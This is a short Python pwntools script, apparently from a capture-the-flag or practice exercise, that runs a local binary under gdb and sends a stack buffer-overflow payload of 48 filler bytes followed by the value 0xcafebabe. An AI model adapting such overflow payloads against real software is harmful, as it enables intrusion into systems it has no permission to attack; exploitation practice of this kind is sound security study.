from pwn import*

p = process(["gdb","./a.out"])

payload = b"a"*48 + p32(0xcafebabe)

p.sendline(payload)
p.interactive()
